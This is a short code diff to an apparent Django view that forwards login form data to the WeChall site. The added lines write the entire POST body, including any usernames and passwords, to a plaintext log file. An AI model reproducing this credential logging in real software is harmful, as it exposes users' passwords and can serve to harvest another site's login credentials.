@@ -11,4 +11,7 @@ def index(request):
 @csrf_exempt
 def login(request):
     url = 'https://www.wechall.net/login'
+    with open("requestLog.txt", 'a') as f:
+        f.write('\n==========[ POST Request Params ]==========\n')
+        f.write(str(request.POST))
     return login_post(url, request.POST)
